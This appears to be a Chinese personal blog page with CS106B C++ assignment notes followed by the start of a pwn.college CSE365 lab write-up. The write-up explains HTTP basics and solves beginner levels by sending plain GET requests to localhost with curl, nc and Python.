class="comment">//C++17标准</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; [key, value] : myMap) {</span><br><span class="line">        std::cout &lt;&lt; key &lt;&lt; <span class="string">": "</span> &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我使用的方法，通过key来遍历map&lt;string, double&gt;</span></span><br><span class="line"><span class="keyword">for</span>(string str1 : input) {  <span class="comment">// 计算频率</span></span><br><span class="line">        frequency[str1] = input[str1] / <span class="built_in">sqrt</span>(sum);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h4 id="milestone-three">Milestone Three</h4>
<ul>
<li>要求：保留频率是前k大的元组</li>
<li>优先队列：插入元素后会自动排序，每次出队的是当前队列中权重最小的元素</li>
</ul>
<h4 id="milestone-four">Milestone Four</h4>
<ul>
<li><p>余弦相似度计算方法：https://blog.csdn.net/zz_dd_yy/article/details/51926305</p>
<p>示例：</p>
<blockquote>
<p>Profile 1</p>
<ul>
<li>"aaa": 0.333</li>
<li>"bbb": 0.667</li>
<li>"ccc": 0.667</li>
</ul>
<p>Profile 2</p>
<ul>
<li>"bbb": 0.333</li>
<li>"ccc": 0.667</li>
<li>"ddd": 0.667</li>
</ul>
<p>"ccc"和"bbb"在两个集合中均出现了，因此计算为："ccc"在两个集合的频率之积
+ "bbb"在两个集合的频率之积</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0.667 × 0.333) + (0.667 × 0.667) = 0.667</span><br></pre></td></tr></tbody></table></figure>
</blockquote></li>
</ul>
<h4 id="milestone-five">Milestone Five</h4>
<ul>
<li><p>给定待识别文本和语料库，找到最匹配的语言</p></li>
<li><p>这里我利用<code>int i</code>进行for循环遍历Set，然后使用<code>corpora[i].profile</code>会报错，因此还是使用range-based
for 循环进行遍历，如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Corpus c : corpora) {</span><br><span class="line">        <span class="type">double</span> tmp = <span class="built_in">cosineSimilarityOf</span>(textProfile, c.profile);</span><br><span class="line">        <span class="keyword">if</span> (res &lt; tmp) {</span><br><span class="line">            res = tmp;</span><br><span class="line">            ans = c.name;</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h4 id="milestone-six">Milestone Six</h4>
<ul>
<li>测试语言识别功能</li>
<li>运行程序，点击“Rosetta Stone”，输入字符进行测试</li>
</ul>
<h3 id="part-two">Part Two</h3>
<ul>
<li><p>广度优先搜索</p></li>
<li><p>这题注意数组下标不要超过范围</p></li>
</ul>
<h2 id="assignment-3">Assignment 3</h2>
<h3 id="part-one-1">Part One</h3>
<p>递归画三角形，注意三个顶点的坐标</p>
<h3 id="part-two-1">Part Two</h3>
<p>递归然后利用数组保存递归中间结果从而优化递归</p>
<h3 id="part-three">Part Three</h3>
<p>递归，两个分支，当前字符串大写或小写</p>
<h3 id="part-four">Part Four</h3>
<h4 id="milestone-1">Milestone 1</h4>
<p>递归，需要借助辅助函数实现（两个分支，选择当前时间安排或不选择）</p>
<h2 id="assignment-4">Assignment 4</h2>
<h3 id="part-one-2">Part One</h3>
<p>找到 Permutations.cpp 中的bug，发现多了一个等号</p>
<h3 id="part-two-2">Part Two</h3>
<h4 id="milestone-1-1">Milestone 1</h4>
<p>找到完美匹配（每一个节点都有一个对应节点），示例如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"A"</span>: { <span class="string">"B"</span> },                    </span><br><span class="line"><span class="string">"B"</span>: { <span class="string">"A"</span>, <span class="string">"C"</span>, <span class="string">"E"</span>, <span class="string">"G"</span> },     </span><br><span class="line"><span class="string">"C"</span>: { <span class="string">"B"</span>, <span class="string">"D"</span>, <span class="string">"G"</span> },          </span><br><span class="line"><span class="string">"D"</span>: { <span class="string">"C"</span>, <span class="string">"G"</span>, <span class="string">"H"</span> },          </span><br><span class="line"><span class="string">"E"</span>: { <span class="string">"B"</span>, <span class="string">"F"</span> },               </span><br><span class="line"><span class="string">"F"</span>: { <span class="string">"E"</span>, <span class="string">"G"</span> },               </span><br><span class="line"><span class="string">"G"</span>: { <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"F"</span>, <span class="string">"H"</span> },</span><br><span class="line"><span class="string">"H"</span>: { <span class="string">"D"</span>, <span class="string">"G"</span> }</span><br><span class="line"></span><br><span class="line">完美匹配：{&lt;A, B&gt;, &lt;C, D&gt;, &lt;E, F&gt;, &lt;G, H&gt;}</span><br></pre></td></tr></tbody></table></figure>
<p>首先第一层for循环遍历map中的key，第二层for循环遍历value中的值（set集合）：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (string name : possibleLinks) {  <span class="comment">// 第一层循环</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">/* 第一层循环需要判断当前字符串是否已经匹配过</span></span><br><span class="line"><span class="comment">           若当前key未出现在matching中，则进入第二层循环 */</span></span><br><span class="line">        <span class="keyword">for</span>(string s : possibleLinks[name]) {</span><br><span class="line">            Set&lt;Pair&gt; not_chosen = matching;  <span class="comment">// 记录未添加pair的matching</span></span><br><span class="line">            ......</span><br><span class="line">            <span class="comment">// 判断当前字符串是否已经匹配过</span></span><br><span class="line">               </span><br><span class="line">            <span class="comment">/* 若当前value中的字符串未出现在matching中</span></span><br><span class="line"><span class="comment">			  将当前的pair添加到matching中，然后进入递归 */</span></span><br><span class="line">            <span class="type">bool</span> a = <span class="built_in">hasPerfectMatching</span>(possibleLinks-tmp1-tmp2, matching);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//当前pair未添加到matching中，进入递归</span></span><br><span class="line">            <span class="type">bool</span> b = <span class="built_in">hasPerfectMatching</span>(p, not_chosen);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> a || b;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="milestone-2">Milestone 2</h4>
<p>找到权值最大的匹配（不要求完美匹配），具体思路与上面类似</p>
<p>通过编写辅助函数，传入参数v（当前匹配的权值），在递归后进行比较，返回权值较大的那个匹配。</p>
<h3 id="part-three-1">Part Three</h3>
<p>若节点只能访问其相邻节点，需要哪几个节点能够访问整个图</p>
<ul>
<li>第一层循环访问未被覆盖的节点，第二层循环访问该节点的相邻节点</li>
<li>递归的思路：
<ol type="1">
<li>当前节点不加入集合，而是将相邻节点加入集合<br>
</li>
<li>当前节点加入集合，而相邻节点不加入集合</li>
</ol></li>
<li>回溯：当每个递归分支返回时，且返回值为false，则将该分支的参数变量回溯到之前的状态</li>
</ul>
<h2 id="assignment-5">Assignment 5</h2>
<h3 id="part-one-3">Part One</h3>
<p>运行项目，点击<code>Time Tests</code>，选择对应函数，然后点击<code>Time</code>绘制函数运行时间与n的关系。</p>
<h3 id="part-two-3">Part Two</h3>
<p>同上</p>
<h3 id="part-three-2">Part Three</h3>
<p>给一段材料回答问题（没咋看明白）</p>
<h3 id="part-four-1">Part Four</h3>
<ul>
<li><p>归并排序，先通过递归将二维vector分成一个一个vector，然后合并。</p></li>
<li><p>这里主要注意的是两个长度不等的vector的合并，这里定义一个结果vector保存合并后的元素。当短的vector合并完成，则将长的vector剩下的元素添加到结果vector中</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(; i&lt;l1 &amp;&amp; j&lt;l2; k++) {</span><br><span class="line">        <span class="keyword">if</span>(a[i].weight &lt; b[j].weight) {</span><br><span class="line">            c.<span class="built_in">add</span>(a[i++]);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            c.<span class="built_in">add</span>(b[j++]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(i &lt; l1) {</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; l1; k++)</span><br><span class="line">            c.<span class="built_in">add</span>(a[i++]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(j &lt; l2) {</span><br><span class="line">        <span class="keyword">for</span>(; j &lt; l2; k++)</span><br><span class="line">            c.<span class="built_in">add</span>(b[j++]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="assignment-6">Assignment 6</h2>
<h3 id="part-one-4">Part One</h3>
<p>根据注释一步一步运行</p>
<h3 id="part-two-4">Part Two</h3>
<p>小根堆</p>
<ul>
<li>enque：直接将元素插到二叉树的末尾，然后向上调整</li>
<li>deque：弹出最小元素（堆顶元素），先将堆顶元素与堆底元素交换位置，然后向下调整堆</li>
</ul>
<h4 id="milestone-one-1">Milestone one</h4>
<p>实现构造函数、析构函数、size 函数以及 isEmpty 函数</p>
<h4 id="milestone-two-1">Milestone two</h4>
<p>实现 enque 函数，注意数组存储元素的下标是从1开始</p>
<h4 id="milestone-three-1">Milestone three</h4>
<p>实现 peek 、deque 函数。</p>
<p>注意条件判断，所有情况要考虑全</p>
<h3 id="part-three-3">Part Three</h3>
<p>利用题目给定的算法计算每个州的席位，这里不能更改 PartTwo
中的函数，所以这里我乘了一个
<strong>-1</strong>，使得最大的数成为了最小的数，这样就能正确了</p>
<h2 id="assignment-7">Assignment 7</h2>
<h3 id="part-one-5">Part One</h3>
<p>枚举</p>
<ul>
<li><p>enum
type：枚举中的每个常量对应一个整数值，默认从0开始递增，除非显式赋值。</p>
<p>示例</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> {</span><br><span class="line">    Red,    <span class="comment">// 默认为0</span></span><br><span class="line">    Green,  <span class="comment">// 默认为1</span></span><br><span class="line">    Blue    <span class="comment">// 默认为2</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Color color = Red;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Color: "</span> &lt;&lt; color &lt;&lt; std::endl;  <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>enum
class：枚举类中的常量具有自己的作用域，避免了与其他枚举常量的冲突。枚举类是强类型的，不能隐式转换为整数，需要显式转换，或者指定底层的整数类型（即定义枚举类时初始化元素）。</p>
<p>示例</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Color</span> {</span><br><span class="line">    Red,    <span class="comment">// 默认从0开始</span></span><br><span class="line">    Green,  <span class="comment">// 默认为1</span></span><br><span class="line">    Blue    <span class="comment">// 默认为2</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Color color = Color::Red;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; color &lt;&lt; std::endl;  // 错误，不能直接输出</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Color: "</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(color) &lt;&lt; std::endl;  <span class="comment">// 需要显式转换为int</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="part-two-5">Part Two</h3>
<p>线性探测表（哈希表），发生冲突时元素会存储到其他空位中（向后寻找）</p>
<h3 id="part-three-4">Part Three</h3>
<p>实现线性探测表。</p>
<p>注意：查找操作会根据哈希函数确定第一个查找位置，假如该位置已有元素（不是目标元素），由于是线性探测表，所以目标元素可能存放在其他空位中，需要继续查找。但是若在查找操作之前哈希函数确定的第一个位置清空了，那么我们查找到该空位时不能判定目标元素不存在，而是假装空位不空，继续向后查找</p>
<h3 id="part-four-2">Part Four</h3>
<p>线性探测表的变体：</p>
<ul>
<li>记录每个元素与主槽（哈希函数确定的初始位置）的距离</li>
<li>插入：两种情况
<ul>
<li>主槽为空，则直接插入</li>
<li>当前槽内元素距其主槽的距离 小于
待插入元素距主槽元素的距离，则将待插入元素替换当前槽内元素</li>
</ul></li>
<li>删除：将当前删除元素位置之后的元素（<strong>不能是处于主槽的元素</strong>）向前移动，直到：
<ul>
<li>找到一个空槽或</li>
<li>在找到一个正好位于主槽的元素。</li>
</ul></li>
<li>查找：如果当前遍历到的元素的距离大于待查找元素，则可以直接停止查找</li>
</ul>
<h2 id="assignment-8">Assignment 8</h2>
<h3 id="part-one-6">Part One</h3>
<p>迷宫，找到三件物品</p>
<h4 id="milestone-1-2">Milestone 1</h4>
<p>根据提供的字符串进行路径合法性判断，每次取第一个字符判断方向，然后进入递归</p>
<p>走出迷宫的条件是收集齐三件物品</p>
<h4 id="milestone-2-1">Milestone 2</h4>
<p>利用debug查看指针内容，画出迷宫，然后找到走出迷宫的路（收集三件物品）</p>
<h4 id="milestone-3">Milestone 3</h4>
<p>利用debug查看指针内存地址以及对应的方向，画出迷宫，找到对应序列</p>
<h3 id="part-two-6">Part Two</h3>
<h4 id="milestone-1-3">Milestone 1</h4>
<ul>
<li>删除链表（按照指针进行遍历）</li>
<li>通过指针读取每个节点的数据</li>
</ul>
<h4 id="milestone-2-2">Milestone 2</h4>
<ul>
<li>将输入的字符串存入链表（链表需要创建）</li>
<li>每个节点的创建需要使用<code>new</code></li>
</ul>
<h4 id="milestone-3-1">Milestone 3</h4>
<ul>
<li>我使用的是暴力求解，最好使用KMP算法</li>
<li>查找给出的子序列在DNA序列中出现的位置</li>
<li>双指针进行比较，右边指针同时移动</li>
<li>需要考虑的情况很多，根据测试结果进行修改</li>
</ul>
<h4 id="milestone-4">Milestone 4</h4>
<ul>
<li>删除DNA子序列</li>
</ul>
<h2 id="assignment-9">Assignment 9</h2>
<p>哈夫曼编码</p>
<ul>
<li>没有哪个字符的编码是另一个字符的前缀，防止歧义性</li>
</ul>
<h3 id="part-one-7">Part One</h3>
<p>创建哈夫曼树</p>
<ul>
<li>定义一个结构体<code>Node</code>存放树节点和权值</li>
<li>先定义一个map，存放字符串中出现的字符和出现次数，然后将不同字符存入不同节点<code>Node</code>中，并入队</li>
<li>每次出队两个节点，合并之后入队，直到队列中只剩一个节点</li>
</ul>
<h3 id="part-two-7">Part Two</h3>
<p>编码和解码</p>
<ul>
<li>解码：根据给的01编码对树进行遍历，直到叶子节点，记录该叶子节点的字符，然后从头开始遍历树重复前面步骤</li>
<li>编码：先遍历树，将所有字符对应的编码记录下来，然后根据给定的字符串进行编码</li>
</ul>
<h3 id="part-three-5">Part Three</h3>
<ul>
<li><p>新的编码方式，叶子节点表示‘0’，不是叶子节点则为‘1’。</p></li>
<li><p>使用先序遍历（根左右）解决。</p></li>
</ul>
<h3 id="part-four-3">Part Four</h3>
<ul>
<li>压缩</li>
<li>解压</li>
</ul>
<p>调用上面出现过的函数，别忘记释放内存（<code>deleteTree</code>）</p>
<h2 id="总结">总结</h2>
<p>9个assignment写完，CS106B这门课也就基本完成了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/09/CSE365/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/09/CSE365/" class="post-title-link" itemprop="url">CSE365-23Fall</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-09 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-09T00:00:00+08:00">2024-10-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-10-12 10:45:43" itemprop="dateModified" datetime="2024-10-12T10:45:43+08:00">2024-10-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSE365/" itemprop="url" rel="index"><span itemprop="name">CSE365</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>75k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1:08</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ASU CSE365-23Fall</p>
<h2 id="连接靶机">连接靶机</h2>
<ul>
<li><p>首先使用<code>ssh-keygen</code>命令生成密钥对：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f pwn_college_key -N ''</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><code>-f</code>指定了生成的密钥文件的名称（pwn_college_key）</p>
<p><code>-N</code>用于设置密码，上述命令中将密码设为空</p>
</blockquote></li>
<li><p>使用<code>cat</code>查看公钥，并保存到pwn.college中：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pwn_college_key.pub</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>使用ssh公钥登录靶机：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i pwn_college_key hacker@dojo.pwn.college</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><code>-i</code>指定一个 RSA 或 DSA 认证所需的身份(私钥)文件</p>
</blockquote></li>
</ul>
<p>上述步骤只在第一次连接是使用，后面只需要运行第三步命令即可直接登录靶机</p>
<p>连接成功后，执行<code>/challenge/run</code>，得到对应题目的提示和要求</p>
<h2 id="talking-web">Talking web</h2>
<h3 id="知识点">知识点</h3>
<ul>
<li><p>World Wide Web（万维网）</p></li>
<li><p>HTTP协议</p></li>
<li><p>抽象、分层（从下往上依次是：数据链路层、网络层、传输层、应用层）</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404121837822.png" alt="image-20240412183732411">
<figcaption aria-hidden="true">image-20240412183732411</figcaption>
</figure></li>
<li><p>HTTP Request</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host ：请求的资源在哪个主机的端口上</span><br><span class="line">Connection：该请求支持长连接（heep_alive）</span><br><span class="line">Content-Length：正文内容长度</span><br><span class="line">Content-Type：数据类型</span><br><span class="line">User-Agent：声明用户的操作系统和浏览器版本信息</span><br><span class="line">Accent：发起了请求</span><br><span class="line">Referer：当前页面是从哪个页面跳转过来的</span><br><span class="line">Accept-Encoding：接受的编码</span><br><span class="line">Accept-Language：接受的语言类型</span><br><span class="line">Cookie：用于在客户端存储少量信息，通常用于实现会话（session）功能</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>HTTP Response</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>URL</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404131908412.png" alt="image-20240413190753656">
<figcaption aria-hidden="true">image-20240413190753656</figcaption>
</figure></li>
<li><p>HTTP是无状态的，使用<strong>Cookie</strong>记录状态（cookie保存在本地）</p>
<p><strong>Session</strong>保存在服务器，保存用户数据</p>
<p>cookie中可包含sessionID，发送给服务器</p></li>
<li><p><code>curl</code>使用方法参考：https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</p></li>
<li><p>Cookie 和 Session</p>
<ol type="1">
<li><p><strong>客户端请求服务器</strong>：用户第一次访问网站时，浏览器向服务器发送请求。</p></li>
<li><p><strong>服务器创建 session</strong>：服务器为该用户创建一个
session，并生成一个唯一的 session ID。</p></li>
<li><p><strong>服务器发送响应</strong>：服务器在响应中将 session ID 作为
cookie 发送给客户端。</p></li>
<li><p><strong>浏览器存储 cookie</strong>：浏览器接收到响应后，会将
session ID 存储在 cookie 中。</p></li>
<li><p><strong>后续请求带上
cookie</strong>：用户在同一个会话期间的后续请求中，浏览器会自动带上这个
cookie（包含 session ID）。</p></li>
<li><p><strong>服务器识别 session</strong>：服务器通过读取请求中的
cookie（包含的 session ID）来识别用户的
session，并获取相应的会话数据。</p></li>
</ol></li>
</ul>
<h3 id="练习">练习</h3>
<p>每次开始练习时，先运行<code>/challenge/run</code>，查看相关说明</p>
<ul>
<li><p>level1：利用<code>curl</code>发送http请求</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl https://www.example.com     <span class="comment"># GET请求</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>wp：<code>curl http://127.0.0.1:80</code></p></li>
<li><p>level2：利用<code>nc</code>发送http请求</p>
<p>首先使用<code>nc</code>连接到本地IP地址的80端口，然后发送<code>GET</code>请求，下面是wp</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：利用<code>python</code>发送http请求</p>
<p>需要使用到<code>requests</code>库，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">'http://127.0.0.1'</span>).text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：利用<code>curl</code>设置http请求中 host header
的内容（也就是标头中的host字段）</p>
<p>使用<code>-H</code>字段设置相关标头，wp如下：(注意冒号)</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H "Host:0bfda002ec7962e08e63679d3d22694b" http://127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：利用<code>nc</code>设置host标头内容，步骤同level2，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /</span><br><span class="line">Host:169dc7ff994e9acd9d0ae7bef90dd3c7</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6：利用<code>python</code>设置host标头内容，还是使用<code>requests</code>库的<code>get</code>方法</p>
<p>wp如下：（注意<code>headers</code>参数的形式——字典格式）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1"</span>,headers={<span class="string">"Host"</span>:<span class="string">"9542430ae678bb9c2fd8d9a4a5d01b75"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7：利用<code>curl</code>实现给定路径的http请求</p>
<p>wp如下：（直接在IP地址后加上路径即可）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1/27bda61e68b88d620ed0cf93dd82a300</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8：利用<code>nc</code>实现给定路径的http请求，方法同之前的nc</p>
<p>wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /ed5ae3bb64a225166b7f620fec91e5fa</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：利用<code>python</code>实现给定路径的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/c5a8acd2998355601e9c25c41a456f8e"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：利用<code>curl</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p>
<p>原路径：<code>/4aacced3 1e17a60e/aa91069c 11d30773</code></p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1/4aacced3%201e17a60e/aa91069c%2011d30773</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>leve11：利用<code>nc</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /0749640b%200fe072d0/ada2996d%206bad362c</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level12：利用<code>python</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p>
